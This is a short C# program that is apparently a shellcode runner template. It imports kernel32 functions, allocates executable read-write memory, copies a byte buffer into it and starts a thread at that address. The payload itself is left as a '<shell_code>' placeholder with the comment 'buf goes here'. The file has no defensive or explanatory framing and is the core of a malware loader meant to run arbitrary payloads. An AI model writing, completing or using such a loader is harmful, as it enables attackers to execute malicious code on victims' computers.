using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint count);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        // buf goes here
        <shell_code>

        IntPtr memory = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(buf, 0, memory, buf.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);

        VirtualFree(memory, 0, 0x8000);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
